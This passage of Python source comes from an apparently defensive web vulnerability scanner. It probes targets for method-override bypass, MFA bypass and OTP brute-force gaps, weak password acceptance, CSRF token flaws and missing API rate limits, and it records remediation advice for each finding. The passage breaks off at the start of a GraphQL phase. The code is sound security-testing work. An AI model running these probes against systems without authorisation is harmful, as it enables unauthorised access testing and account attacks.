                                "Enforce strict scope validation. Only allow scopes that "
                                "are pre-registered for the client application. Reject or "
                                "strip unauthorized scopes from authorization requests."
                            ),
                        )
                        vc.log(f"[oauth] Scope escalation accepted: {scope_desc}", "SUCCESS")
                        break
                elif r.status_code == 200:
                    # Consent page shown — scope might be accepted, but need user
                    # interaction. Log as informational.
                    if "consent" in r.text.lower() and scope_desc in r.text.lower():
                        vc.log(f"[oauth] Escalated scope '{scope_desc}' shown in consent page", "INFO")
            except Exception:
                pass

    vc.status(phase, "OAuth Flow Testing", "complete", "Done", 5, 5)
    vc.log("[oauth] OAuth flow testing complete", "SUCCESS")

# ── Auth / Session / CSRF / GraphQL Extensions ──────────────────────


def _test_verb_tunneling(target: dict, cfg: dict, out: "OutputManager",
                         sess: "requests.Session",
                         crawl_data: dict) -> None:
    """Test HTTP method override headers to bypass method restrictions."""
    phase   = "verb_tunneling"
    url     = target["url"]
    timeout = cfg.get("timeout", 10)
    vc.status(phase, "Verb Tunneling", "running", "Collecting endpoints", 0, 1)

    # Gather endpoints from crawl data or fall back to base URL
    endpoints: list = []
    for link in (crawl_data or {}).get("links", []):
        _u = link if isinstance(link, str) else link.get("url", "")
        if _u and _u not in endpoints:
            endpoints.append(_u)
    if not endpoints:
        endpoints = [url]
    endpoints = endpoints[:5]

    _override_headers = [
        ("X-HTTP-Method-Override", "DELETE"),
        ("X-HTTP-Method", "PUT"),
        ("X-Method-Override", "PATCH"),
        ("X-HTTP-Method-Override", "TRACE"),
    ]
    _found: set = set()

    for ep_url in endpoints:
        if ep_url in _found:
            continue
        # Baseline: normal POST
        try:
            baseline = sess.post(ep_url, timeout=timeout, allow_redirects=False)
        except Exception:
            continue
        bl_status = baseline.status_code

        for hdr_name, hdr_method in _override_headers:
            try:
                r = sess.post(ep_url, timeout=timeout, allow_redirects=False,
                              headers={hdr_name: hdr_method})
                # If baseline was 405/403 but override returns 200/204, or
                # if the response differs materially, flag it
                if r.status_code in (200, 204) and bl_status in (405, 403, 404):
                    _found.add(ep_url)
                    _rq, _rp = _save_http_evidence(
                        out, phase, f"verb_tunnel_{hdr_method}",
                        r, endpoint_url=ep_url, method="POST")
                    out.add_finding(
                        title=f"HTTP Method Override Bypass: {hdr_method} via {hdr_name}",
                        url=ep_url, port=target["port"], risk="MEDIUM",
                        description=(
                            f"The endpoint at {ep_url} accepted a POST request with "
                            f"'{hdr_name}: {hdr_method}' and returned HTTP {r.status_code}, "
                            f"while a normal POST returned HTTP {bl_status}. This indicates "
                            f"the server honours method override headers, allowing an attacker "
                            f"to bypass method-based access controls."
                        ),
                        output=(f"Endpoint: {ep_url}\n"
                                f"Header: {hdr_name}: {hdr_method}\n"
                                f"Baseline POST: HTTP {bl_status}\n"
                                f"Overridden: HTTP {r.status_code}"),
                        output_file=f"{_rq},{_rp}",
                        sources="fracture-verb-tunneling",
                        service=target["scheme"], affected=ep_url,
                        owasp="A01:2025 Broken Access Control", nist="AC-3",
                        cvss_score=5.3,
                        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
                        cwe=["CWE-650"],
                        remediation=(
                            "Disable support for X-HTTP-Method-Override, X-HTTP-Method, and "
                            "X-Method-Override headers unless explicitly required. Enforce "
                            "method restrictions at the framework or reverse-proxy level."
                        ),
                        http_code=r.status_code,
                    )
                    vc.log(f"[verb_tunneling] Override bypass at {ep_url} via {hdr_name}: {hdr_method}", "SUCCESS")
                    break  # one finding per endpoint is enough
            except Exception:
                pass

        # Also test _method form parameter (Rails/Laravel convention)
        if ep_url not in _found:
            for override_method in ("DELETE", "PUT"):
                try:
                    r = sess.post(ep_url, data={"_method": override_method},
                                  timeout=timeout, allow_redirects=False)
                    if r.status_code in (200, 204) and bl_status in (405, 403, 404):
                        _found.add(ep_url)
                        _rq, _rp = _save_http_evidence(
                            out, phase, f"verb_tunnel_param_{override_method}",
                            r, endpoint_url=ep_url, method="POST")
                        out.add_finding(
                            title=f"HTTP Method Override Bypass: {override_method} via _method Parameter",
                            url=ep_url, port=target["port"], risk="MEDIUM",
                            description=(
                                f"The endpoint at {ep_url} accepted a POST request with "
                                f"'_method={override_method}' form parameter and returned "
                                f"HTTP {r.status_code}, while a normal POST returned "
                                f"HTTP {bl_status}. The server processes Rails/Laravel-style "
                                f"method override parameters."
                            ),
                            output=(f"Endpoint: {ep_url}\n"
                                    f"Parameter: _method={override_method}\n"
                                    f"Baseline POST: HTTP {bl_status}\n"
                                    f"Overridden: HTTP {r.status_code}"),
                            output_file=f"{_rq},{_rp}",
                            sources="fracture-verb-tunneling",
                            service=target["scheme"], affected=ep_url,
                            owasp="A01:2025 Broken Access Control", nist="AC-3",
                            cvss_score=5.3,
                            cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
                            cwe=["CWE-650"],
                            remediation=(
                                "Disable _method parameter processing in production. "
                                "Enforce method restrictions at the web server or reverse-proxy level."
                            ),
                            http_code=r.status_code,
                        )
                        vc.log(f"[verb_tunneling] _method param bypass at {ep_url}", "SUCCESS")
                        break
                except Exception:
                    pass

    vc.status(phase, "Verb Tunneling", "complete", "Done", 1, 1)
    vc.log("[verb_tunneling] Phase complete", "SUCCESS")


def _test_mfa_bypass(target: dict, cfg: dict, out: "OutputManager",
                     sess: "requests.Session",
                     crawl_data: dict) -> None:
    """Test MFA/2FA bypass techniques — safe, max 5 total attempts."""
    phase   = "mfa_bypass"
    url     = target["url"]
    timeout = cfg.get("timeout", 10)
    forms   = (crawl_data or {}).get("forms", [])
    links   = (crawl_data or {}).get("links", [])
    vc.status(phase, "MFA Bypass", "running", "Detecting MFA", 0, 4)

    _MFA_RE = re.compile(
        r'verify|2fa|otp|mfa|two.?factor|verification.?code|totp|authenticator',
        re.I,
    )

    # Find MFA-related pages/forms
    mfa_urls: list = []
    mfa_forms: list = []
    for link in links:
        _lu = link if isinstance(link, str) else link.get("url", "")
        if _lu and _MFA_RE.search(_lu):
            mfa_urls.append(_lu)
    for form in forms:
        action = form.get("action", "")
        inputs = form.get("inputs", [])
        if _MFA_RE.search(action) or any(
            _MFA_RE.search(i.get("name", "") + i.get("id", ""))
            for i in inputs
        ):
            mfa_forms.append(form)
            if action and action not in mfa_urls:
                mfa_urls.append(action)

    if not mfa_urls and not mfa_forms:
        vc.log("[mfa_bypass] No MFA pages/forms detected — skipping", "INFO")
        vc.status(phase, "MFA Bypass", "complete", "No MFA detected", 4, 4)
        return

    vc.log(f"[mfa_bypass] Found {len(mfa_urls)} MFA URLs, {len(mfa_forms)} MFA forms", "INFO")

    # ── Test 1: Direct navigation bypass ──
    vc.status(phase, "MFA Bypass", "running", "Direct navigation test", 1, 4)
    # After hitting an MFA page, try to access protected pages directly
    protected_pages = [
        l if isinstance(l, str) else l.get("url", "")
        for l in links if not _MFA_RE.search(
            l if isinstance(l, str) else l.get("url", ""))
    ][:5]
    for mfa_url in mfa_urls[:1]:
        try:
            # Hit the MFA page first
            sess.get(mfa_url, timeout=timeout)
        except Exception:
            continue
        for ppage in protected_pages:
            try:
                r = sess.get(ppage, timeout=timeout, allow_redirects=False)
                # If we get a 200 (not a redirect back to MFA/login), MFA can be bypassed
                if r.status_code == 200 and not _MFA_RE.search(r.text[:2000]):
                    _rq, _rp = _save_http_evidence(
                        out, phase, "mfa_bypass_direct", r, endpoint_url=ppage)
                    out.add_finding(
                        title="MFA Bypass — Direct Navigation",
                        url=ppage, port=target["port"], risk="CRITICAL",
                        description=(
                            f"After reaching the MFA verification page at {mfa_url}, "
                            f"directly navigating to {ppage} returned HTTP 200 with content "
                            f"that does not appear to be the MFA prompt. This suggests MFA "
                            f"can be bypassed by navigating directly to protected pages."
                        ),
                        output=(f"MFA page: {mfa_url}\n"
                                f"Protected page: {ppage}\n"
                                f"Status: HTTP {r.status_code}\n"
                                f"Body snippet: {r.text[:300]}"),
                        output_file=f"{_rq},{_rp}",
                        sources="fracture-mfa-bypass",
                        service=target["scheme"], affected=ppage,
                        owasp="A07:2025 Identification and Authentication Failures",
                        nist="IA-2",
                        cvss_score=9.8,
                        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                        cwe=["CWE-287"],
                        remediation=(
                            "Enforce MFA completion server-side before granting access "
                            "to any protected resource. Do not rely on client-side flow "
                            "control to enforce the MFA step."
                        ),
                        http_code=r.status_code,
                    )
                    vc.log(f"[mfa_bypass] Direct navigation bypass: {ppage}", "SUCCESS")
                    break  # one finding is enough
            except Exception:
                pass

    # ── Test 2: OTP reuse detection ──
    vc.status(phase, "MFA Bypass", "running", "OTP reuse test", 2, 4)
    for form in mfa_forms[:1]:
        action = form.get("action", url)
        inputs = form.get("inputs", [])
        otp_field = next(
            (i["name"] for i in inputs
             if re.search(r'otp|code|token|verify|pin', i.get("name", ""), re.I)),
            None,
        )
        if not otp_field:
            continue
        dummy_otp = "000000"
        data = {i["name"]: "" for i in inputs if i.get("name")}
        data[otp_field] = dummy_otp
        try:
            r1 = sess.post(action, data=data, timeout=timeout)
            r2 = sess.post(action, data=data, timeout=timeout)
            # If both return the same non-error response, OTP reuse might be possible
            # (but with dummy OTP both should fail — we're looking for different error
            # messages between first and second use)
            if (r1.status_code == r2.status_code and
                    abs(len(r1.text) - len(r2.text)) < 50 and
                    r1.status_code == 200):
                vc.log(f"[mfa_bypass] OTP reuse: same response for repeated dummy OTP at {action}", "INFO")
        except Exception:
            pass

    # ── Test 3: Missing rate limiting on OTP ──
    vc.status(phase, "MFA Bypass", "running", "OTP rate limiting", 3, 4)
    for form in mfa_forms[:1]:
        action = form.get("action", url)
        inputs = form.get("inputs", [])
        otp_field = next(
            (i["name"] for i in inputs
             if re.search(r'otp|code|token|verify|pin', i.get("name", ""), re.I)),
            None,
        )
        if not otp_field:
            continue
        data = {i["name"]: "" for i in inputs if i.get("name")}
        _rate_limited = False
        r = None
        for attempt in range(5):
            data[otp_field] = f"{10000 + attempt:06d}"
            try:
                r = sess.post(action, data=data, timeout=timeout)
                if r.status_code == 429 or re.search(
                    r'rate.?limit|too.?many|throttl|locked|try.?again.?later',
                    r.text[:1000], re.I,
                ):
                    _rate_limited = True
                    break
            except Exception:
                break
        if not _rate_limited and otp_field and r is not None:
            _rq, _rp = _save_http_evidence(
                out, phase, "mfa_no_rate_limit", r, endpoint_url=action)
            out.add_finding(
                title="MFA Missing Rate Limiting on OTP",
                url=action, port=target["port"], risk="MEDIUM",
                description=(
                    f"The MFA verification endpoint at {action} accepted 5 rapid "
                    f"consecutive OTP submissions without rate limiting, lockout, or "
                    f"throttling. An attacker could brute-force the OTP value."
                ),
                output=(f"Endpoint: {action}\n"
                        f"OTP field: {otp_field}\n"
                        f"Attempts: 5 (all accepted)\n"
                        f"Last status: HTTP {r.status_code}"),
                output_file=f"{_rq},{_rp}",
                sources="fracture-mfa-bypass",
                service=target["scheme"], affected=action,
                owasp="A07:2025 Identification and Authentication Failures",
                nist="IA-2",
                cvss_score=5.3,
                cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
                cwe=["CWE-287", "CWE-307"],
                remediation=(
                    "Implement rate limiting and account lockout on MFA verification "
                    "endpoints. Limit OTP attempts (e.g. 3-5 before temporary lockout). "
                    "Use exponential backoff or CAPTCHA after failed attempts."
                ),
                http_code=r.status_code,
            )
            vc.log(f"[mfa_bypass] No rate limiting on OTP at {action}", "SUCCESS")

    vc.status(phase, "MFA Bypass", "complete", "Done", 4, 4)
    vc.log("[mfa_bypass] Phase complete", "SUCCESS")


def _test_password_policy(target: dict, cfg: dict, out: "OutputManager",
                          sess: "requests.Session",
                          crawl_data: dict) -> None:
    """Test password policy weaknesses on registration/change forms."""
    phase   = "password_policy"
    url     = target["url"]
    timeout = cfg.get("timeout", 10)
    forms   = (crawl_data or {}).get("forms", [])
    vc.status(phase, "Password Policy", "running", "Locating forms", 0, 2)

    _PASS_FIELD_RE = re.compile(
        r'password|passwd|new_password|confirm_password|pass_new|pwd', re.I)
    _REGISTER_RE = re.compile(
        r'register|signup|sign.up|create.?account|join|enroll', re.I)

    # Find registration or password-change forms
    pw_forms: list = []
    for form in forms:
        action = form.get("action", "")
        inputs = form.get("inputs", [])
        has_pass = any(_PASS_FIELD_RE.search(i.get("name", "")) or
                       i.get("type", "").lower() == "password"
                       for i in inputs)
        if has_pass and _REGISTER_RE.search(action):
            pw_forms.append(form)

    # Also probe common registration URLs
    if not pw_forms:
        _reg_paths = ["/register", "/signup", "/create-account",
                      "/api/register", "/api/signup", "/Account/Register"]
        for rp in _reg_paths:
            try:
                r = sess.get(url.rstrip("/") + rp, timeout=timeout)
                if r.status_code == 200 and re.search(
                    r'type=["\']?password', r.text, re.I
                ):
                    # Extract form from HTML
                    _action = url.rstrip("/") + rp
                    pw_forms.append({
                        "action": _action, "method": "POST",
                        "inputs": [
                            {"name": "username", "type": "text"},
                            {"name": "password", "type": "password"},
                            {"name": "confirm_password", "type": "password"},
                        ],
                    })
                    break
            except Exception:
                pass

    if not pw_forms:
        vc.log("[password_policy] No registration/change forms found — skipping", "INFO")
        vc.status(phase, "Password Policy", "complete", "No forms", 2, 2)
        return

    vc.status(phase, "Password Policy", "running", "Testing weak passwords", 1, 2)

    # Weak passwords to test — NOT intended to create accounts, just
    # detect validation error messages vs acceptance
    _weak_passwords = [
        ("a", "1-character password"),
        ("12345678", "common numeric-only password"),
        ("password", "dictionary word"),
        ("Aa1!", "4-character password (too short)"),
    ]
    _REJECT_RE = re.compile(
        r'too.?short|minimum|at.?least|must.?contain|complexity|'
        r'password.?requirement|not.?strong|weak.?password|'
        r'invalid.?password|does.?not.?meet|must.?be|'
        r'characters.?long|upper|lower|digit|special', re.I)
    _ACCEPT_RE = re.compile(
        r'success|created|registered|welcome|thank.?you|'
        r'account.?created|verify.?email|confirm', re.I)

    accepted_weak: list = []
    for form in pw_forms[:2]:
        action = form.get("action", url)
        inputs = form.get("inputs", [])
        pass_field = next(
            (i["name"] for i in inputs
             if _PASS_FIELD_RE.search(i.get("name", "")) or
             i.get("type", "").lower() == "password"),
            "password",
        )
        for weak_pw, desc in _weak_passwords:
            data = {i["name"]: "fracture_test_user" for i in inputs if i.get("name")}
            data[pass_field] = weak_pw
            # Set confirm field if present
            for i in inputs:
                if re.search(r'confirm|repeat|retype', i.get("name", ""), re.I):
                    data[i["name"]] = weak_pw
            try:
                r = sess.post(action, data=data, timeout=timeout)
                body = r.text[:3000]
                if _ACCEPT_RE.search(body) and not _REJECT_RE.search(body):
                    accepted_weak.append((weak_pw, desc, r.status_code))
                elif r.status_code in (200, 201) and not _REJECT_RE.search(body):
                    # Possibly accepted — log for review
                    accepted_weak.append((weak_pw, desc, r.status_code))
            except Exception:
                pass

    if accepted_weak:
        details = "\n".join(
            f"  • '{pw}' ({desc}) — HTTP {code}"
            for pw, desc, code in accepted_weak
        )
        _pwpol_ev = ""
        try:
            _pwpol_path = out.output_path(phase, "weak_password_policy")
            _pwpol_path.write_text(
                f"Password Policy Test Results\n"
                f"Form: {pw_forms[0].get('action', url)}\n\n"
                f"Accepted weak passwords:\n{details}\n",
                encoding="utf-8")
            _pwpol_ev = str(_pwpol_path)
        except Exception:
            pass
        out.add_finding(
            title="Weak Password Policy",
            url=pw_forms[0].get("action", url), port=target["port"],
            risk="MEDIUM",
            description=(
                f"The registration/password form at {pw_forms[0].get('action', url)} "
                f"accepted one or more weak passwords without adequate rejection. "
                f"A weak password policy allows attackers to guess credentials."
            ),
            output=f"Accepted weak passwords:\n{details}",
            sources="fracture-password-policy",
            service=target["scheme"],
            output_file=_pwpol_ev,
            affected=pw_forms[0].get("action", url),
            owasp="A07:2025 Identification and Authentication Failures",
            nist="IA-5",
            cvss_score=5.3,
            cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
            cwe=["CWE-521"],
            remediation=(
                "Enforce a minimum password length of 8-12 characters. "
                "Require a mix of uppercase, lowercase, digits, and special characters. "
                "Check passwords against a list of common/breached passwords (e.g. HIBP). "
                "Consider implementing NIST SP 800-63B password guidelines."
            ),
        )
        vc.log(f"[password_policy] Weak passwords accepted: {len(accepted_weak)}", "SUCCESS")

    vc.status(phase, "Password Policy", "complete", "Done", 2, 2)
    vc.log("[password_policy] Phase complete", "SUCCESS")


def _test_csrf_advanced(target: dict, cfg: dict, out: "OutputManager",
                        sess: "requests.Session",
                        crawl_data: dict) -> None:
    """Advanced CSRF testing beyond basic token detection."""
    phase   = "csrf_advanced"
    url     = target["url"]
    timeout = cfg.get("timeout", 10)
    forms   = (crawl_data or {}).get("forms", [])
    vc.status(phase, "Advanced CSRF", "running", "SameSite analysis", 0, 4)

    _CSRF_TOKEN_RE = re.compile(
        r'csrf|token|nonce|_token|authenticity|__RequestVerificationToken', re.I)

    # ── Test 1: SameSite=None on session cookies ──
    try:
        r = sess.get(url, timeout=timeout)
        for hdr_val in r.headers.get("Set-Cookie", "").split(","):
            if re.search(r'samesite\s*=\s*none', hdr_val, re.I):
                _cookie_name = re.match(r'\s*([^=]+)', hdr_val)
                cname = _cookie_name.group(1).strip() if _cookie_name else "(unknown)"
                _ss_rq, _ss_rp = _save_http_evidence(
                    out, phase, f"samesite_{cname[:20]}", r, endpoint_url=url)
                out.add_finding(
                    title=f"Cookie SameSite=None Enables Cross-Site Requests: {cname}",
                    url=url, port=target["port"], risk="MEDIUM",
                    description=(
                        f"Cookie '{cname}' is set with SameSite=None, which allows it "
                        f"to be sent on cross-site requests. Combined with missing or "
                        f"weak CSRF protection, this enables cross-site request forgery."
                    ),
                    output=f"Set-Cookie: {hdr_val.strip()[:300]}",
                    output_file=f"{_ss_rq},{_ss_rp}",
                    sources="fracture-csrf-advanced",
                    service=target["scheme"], affected=url,
                    owasp="A01:2025 Broken Access Control", nist="SC-23",
                    cvss_score=5.3,
                    cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
                    cwe=["CWE-352", "CWE-1275"],
                    remediation=(
                        "Set SameSite=Lax or SameSite=Strict on session and "
                        "authentication cookies unless cross-site sending is "
                        "explicitly required (e.g. third-party embeds)."
                    ),
                )
                vc.log(f"[csrf_advanced] SameSite=None on cookie '{cname}'", "SUCCESS")
    except Exception:
        pass

    # ── Test 2: JSON API accepts form-encoded Content-Type (CSRF) ──
    vc.status(phase, "Advanced CSRF", "running", "JSON CT bypass", 1, 4)
    _api_endpoints: list = []
    for link in (crawl_data or {}).get("links", []):
        _lu = link if isinstance(link, str) else link.get("url", "")
        if _lu and "/api/" in _lu:
            _api_endpoints.append(_lu)
    for ep in _api_endpoints[:3]:
        try:
            # Baseline: JSON POST
            r_json = sess.post(ep, json={"test": "fracture"},
                               timeout=timeout, allow_redirects=False)
            if r_json.status_code not in range(200, 400):
                continue
            # Test: same request as form-encoded
            r_form = sess.post(ep, data={"test": "fracture"},
                               timeout=timeout, allow_redirects=False,
                               headers={"Content-Type": "application/x-www-form-urlencoded"})
            if r_form.status_code in range(200, 300):
                _ct_body = (r_form.text or "")[:8000]
                _ct_rel  = urllib.parse.urlparse(ep).path or "/"
                if _response_is_error_page(_ct_body, _ct_rel):
                    continue
                if _matches_error_fingerprint(_ct_body):
                    continue
                _rq, _rp = _save_http_evidence(
                    out, phase, f"json_csrf_{ep.split('/')[-1][:20]}",
                    r_form, endpoint_url=ep, method="POST")
                out.add_finding(
                    title="JSON API Accepts Form Content-Type (CSRF)",
                    url=ep, port=target["port"], risk="MEDIUM",
                    description=(
                        f"The JSON API endpoint at {ep} also accepts "
                        f"application/x-www-form-urlencoded requests (HTTP {r_form.status_code}). "
                        f"Cross-site HTML forms can submit this content type, enabling "
                        f"CSRF attacks against the API endpoint."
                    ),
                    output=(f"Endpoint: {ep}\n"
                            f"JSON POST: HTTP {r_json.status_code}\n"
                            f"Form POST: HTTP {r_form.status_code}\n"
                            f"Response: {r_form.text[:300]}"),
                    output_file=f"{_rq},{_rp}",
                    sources="fracture-csrf-advanced",
                    service=target["scheme"], affected=ep,
                    owasp="A01:2025 Broken Access Control", nist="SC-23",
                    cvss_score=5.3,
                    cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
                    cwe=["CWE-352"],
                    remediation=(
                        "Reject requests with unexpected Content-Type headers. "
                        "Require application/json and validate the Content-Type "
                        "server-side. Add CSRF tokens to state-changing API endpoints."
                    ),
                    http_code=r_form.status_code,
                )
                vc.log(f"[csrf_advanced] JSON API accepts form CT at {ep}", "SUCCESS")
        except Exception:
            pass

    # ── Test 3: CSRF token in URL query string ──
    vc.status(phase, "Advanced CSRF", "running", "Token in URL", 2, 4)
    for form in forms[:10]:
        action = form.get("action", "")
        if not action:
            continue
        parsed = urllib.parse.urlparse(action)
        params = urllib.parse.parse_qs(parsed.query)
        for pname in params:
            if _CSRF_TOKEN_RE.search(pname):
                _csrf_url_ev = out.output_path(phase, f"csrf_url_{pname[:20]}")
                _csrf_url_ev.write_text(
                    f"Form action URL: {action}\n"
                    f"Token parameter: {pname}\n"
                    f"Value: {params[pname]}\n"
                    f"Full query string: {parsed.query}\n",
                    encoding="utf-8",
                )
                out.add_finding(
                    title="CSRF Token Leaked via URL Query Parameter",
                    url=action, port=target["port"], risk="MEDIUM",
                    description=(
                        f"A CSRF token parameter '{pname}' appears in the URL query "
                        f"string of form action {action}. Tokens in URLs leak through "
                        f"the Referer header, browser history, and server logs."
                    ),
                    output=f"Form action: {action}\nToken param: {pname}",
                    output_file=str(_csrf_url_ev),
                    sources="fracture-csrf-advanced",
                    service=target["scheme"], affected=action,
                    owasp="A01:2025 Broken Access Control", nist="SC-23",
                    cvss_score=5.3,
                    cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
                    cwe=["CWE-598"],
                    remediation=(
                        "Send CSRF tokens in hidden form fields or custom HTTP headers, "
                        "never in URL query parameters. Set Referrer-Policy to prevent leakage."
                    ),
                )
                vc.log(f"[csrf_advanced] CSRF token in URL at {action}", "SUCCESS")
                break

    # ── Test 4: CSRF token validation ──
    vc.status(phase, "Advanced CSRF", "running", "Token validation", 3, 4)
    for form in forms[:5]:
        action = form.get("action", url)
        method = form.get("method", "GET").upper()
        if method != "POST":
            continue
        inputs = form.get("inputs", [])
        csrf_fields = [
            i for i in inputs if _CSRF_TOKEN_RE.search(i.get("name", ""))
        ]
        if not csrf_fields:
            continue

        csrf_name = csrf_fields[0]["name"]
        csrf_val  = csrf_fields[0].get("value", "")
        base_data = {i["name"]: i.get("value", "test") for i in inputs if i.get("name")}

        _bypass_tests = [
            ("empty", ""),
            ("modified", csrf_val[:-1] + ("X" if csrf_val and csrf_val[-1] != "X" else "Y") if csrf_val else "invalid"),
        ]

        for test_label, test_val in _bypass_tests:
            data = dict(base_data)
            data[csrf_name] = test_val
            try:
                r = sess.post(action, data=data, timeout=timeout)
                if r.status_code in (200, 302) and not re.search(
                    r'invalid.?token|csrf.?fail|forbidden|expired.?token',
                    r.text[:2000], re.I,
                ):
                    # Skip error/catch-all pages
                    _tv_body = (r.text or "")[:8000]
                    _tv_rel  = urllib.parse.urlparse(action).path or "/"
                    if _response_is_error_page(_tv_body, _tv_rel):
                        continue
                    if _matches_error_fingerprint(_tv_body):
                        continue
                    _rq, _rp = _save_http_evidence(
                        out, phase, f"csrf_token_{test_label}",
                        r, endpoint_url=action, method="POST")
                    out.add_finding(
                        title=f"CSRF Token Not Validated ({test_label} token accepted)",
                        url=action, port=target["port"], risk="HIGH",
                        description=(
                            f"The form at {action} accepted a POST with an {test_label} "
                            f"CSRF token (field '{csrf_name}') and returned HTTP {r.status_code}. "
                            f"The server does not properly validate the CSRF token."
                        ),
                        output=(f"Form: {action}\n"
                                f"CSRF field: {csrf_name}\n"
                                f"Test: {test_label} (value: '{test_val[:30]}')\n"
                                f"Status: HTTP {r.status_code}"),
                        output_file=f"{_rq},{_rp}",
                        sources="fracture-csrf-advanced",
                        service=target["scheme"], affected=action,
                        owasp="A01:2025 Broken Access Control", nist="SC-23",
                        cvss_score=8.1,
                        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N",
                        cwe=["CWE-352"],
                        remediation=(
                            "Validate CSRF tokens server-side on every state-changing request. "
                            "Reject requests with missing, empty, or invalid tokens. "
                            "Use framework-provided CSRF protection (e.g. Django middleware, "
                            "ASP.NET AntiForgeryToken)."
                        ),
                        http_code=r.status_code,
                    )
                    vc.log(f"[csrf_advanced] Token not validated ({test_label}) at {action}", "SUCCESS")
                    break  # one finding per form
            except Exception:
                pass

        # Also test with token field removed entirely
        data_no_token = {k: v for k, v in base_data.items() if k != csrf_name}
        try:
            r = sess.post(action, data=data_no_token, timeout=timeout)
            if r.status_code in (200, 302) and not re.search(
                r'invalid.?token|csrf.?fail|forbidden|missing.?token',
                r.text[:2000], re.I,
            ):
                # Skip error/catch-all pages
                _rm_body = (r.text or "")[:8000]
                _rm_rel  = urllib.parse.urlparse(action).path or "/"
                if _response_is_error_page(_rm_body, _rm_rel):
                    pass  # skip finding
                elif _matches_error_fingerprint(_rm_body):
                    pass  # skip finding
                else:
                    _rq, _rp = _save_http_evidence(
                        out, phase, "csrf_token_removed",
                        r, endpoint_url=action, method="POST")
                    out.add_finding(
                        title="CSRF Token Not Required (removed token accepted)",
                        url=action, port=target["port"], risk="HIGH",
                        description=(
                            f"The form at {action} accepted a POST request with the "
                            f"CSRF token field '{csrf_name}' entirely removed. "
                            f"The server does not require the token for state-changing requests."
                        ),
                        output=(f"Form: {action}\n"
                                f"Removed field: {csrf_name}\n"
                                f"Status: HTTP {r.status_code}"),
                        output_file=f"{_rq},{_rp}",
                        sources="fracture-csrf-advanced",
                        service=target["scheme"], affected=action,
                        owasp="A01:2025 Broken Access Control", nist="SC-23",
                        cvss_score=8.1,
                        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N",
                        cwe=["CWE-352"],
                        remediation=(
                            "Require and validate CSRF tokens on every state-changing request. "
                            "Reject requests that omit the token entirely."
                        ),
                        http_code=r.status_code,
                    )
                    vc.log(f"[csrf_advanced] Token not required at {action}", "SUCCESS")
        except Exception:
            pass

    vc.status(phase, "Advanced CSRF", "complete", "Done", 4, 4)
    vc.log("[csrf_advanced] Phase complete", "SUCCESS")


def _test_api_rate_limiting(target: dict, cfg: dict, out: "OutputManager",
                            sess: "requests.Session",
                            crawl_data: dict) -> None:
    """Test per-endpoint rate limiting on data APIs — max 10 requests each."""
    phase   = "api_rate_limit"
    url     = target["url"]
    timeout = cfg.get("timeout", 10)
    vc.status(phase, "API Rate Limiting", "running", "Finding API endpoints", 0, 2)

    # Find API-like endpoints from crawl data
    api_endpoints: list = []
    for link in (crawl_data or {}).get("links", []):
        _lu = link if isinstance(link, str) else link.get("url", "")
        if _lu and "/api/" in _lu and _lu not in api_endpoints:
            api_endpoints.append(_lu)
    # Also check base url variants
    for suffix in ["/api/", "/api/v1/", "/api/v2/"]:
        test_url = url.rstrip("/") + suffix
        if test_url not in api_endpoints:
            try:
                r = sess.get(test_url, timeout=timeout)
                if r.status_code in (200, 401, 403):
                    api_endpoints.append(test_url)
            except Exception:
                pass

    api_endpoints = api_endpoints[:5]
    if not api_endpoints:
        vc.log("[api_rate_limit] No API endpoints found — skipping", "INFO")
        vc.status(phase, "API Rate Limiting", "complete", "No endpoints", 2, 2)
        return

    vc.status(phase, "API Rate Limiting", "running", "Testing rate limits", 1, 2)

    for ep in api_endpoints:
        _rate_limited = False
        _last_r = None
        for i in range(10):
            try:
                r = sess.get(ep, timeout=timeout)
                _last_r = r
                if r.status_code == 429:
                    _rate_limited = True
                    break
                if r.headers.get("Retry-After"):
                    _rate_limited = True
                    break
                if re.search(r'rate.?limit|too.?many|throttl', r.text[:500], re.I):
                    _rate_limited = True
                    break
            except Exception:
                break

        if not _rate_limited and _last_r:
            _rl_rq, _rl_rp = _save_http_evidence(
                out, phase, f"rate_limit_{ep.split('/')[-1][:20]}",
                _last_r, endpoint_url=ep)
            out.add_finding(
                title="API Endpoint Missing Rate Limiting",
                url=ep, port=target["port"], risk="INFO",
                description=(
                    f"The API endpoint at {ep} accepted 10 rapid consecutive requests "
                    f"without any rate limiting response (no HTTP 429, no Retry-After "
                    f"header, no throttle message). Absence of rate limiting can allow "
                    f"credential stuffing, data scraping, or brute-force attacks."
                ),
                output=(f"Endpoint: {ep}\n"
                        f"Requests sent: 10\n"
                        f"All returned: HTTP {_last_r.status_code}\n"
                        f"Rate limiting headers: None"),
                output_file=f"{_rl_rq},{_rl_rp}",
                sources="fracture-api-rate-limit",
                service=target["scheme"], affected=ep,
                owasp="A04:2025 Insecure Design", nist="SC-5",
                cwe=["CWE-770"],
                remediation=(
                    "Implement per-endpoint rate limiting using API gateway or "
                    "application-level middleware. Return HTTP 429 with a Retry-After "
                    "header when limits are exceeded. Consider different limits for "
                    "authenticated vs unauthenticated requests."
                ),
            )
            vc.log(f"[api_rate_limit] No rate limiting at {ep}", "SUCCESS")

    vc.status(phase, "API Rate Limiting", "complete", "Done", 2, 2)
    vc.log("[api_rate_limit] Phase complete", "SUCCESS")


def _test_graphql_advanced(target: dict, cfg: dict, out: "OutputManager",
                           sess: "requests.Session",
                           crawl_data: dict) -> None:
    """Advanced GraphQL testing — alias batching, circular fragments, debug. NO DoS."""
    phase   = "graphql_advanced"
    url     = target["url"]
    timeout = cfg.get("timeout", 10)
    vc.status(phase, "GraphQL Advanced", "running", "Finding endpoint", 0, 4)

    # Locate GraphQL endpoint
    _gql_paths = ["/graphql", "/api/graphql", "/graphql/v1",
